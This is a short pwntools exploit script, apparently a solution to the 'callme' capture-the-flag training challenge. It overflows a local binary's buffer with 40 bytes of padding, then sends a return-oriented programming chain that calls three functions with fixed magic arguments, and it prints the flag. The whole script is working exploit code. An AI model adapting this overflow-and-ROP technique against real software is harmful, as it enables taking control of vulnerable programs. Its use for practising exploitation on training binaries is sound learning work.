from pwn import *

context.binary = "./callme"
r = ROP(context.binary)
p = process()
r.callme_one(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
r.callme_two(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
r.callme_three(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)
p.send(b"A" * 8 * 5 + r.chain())
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
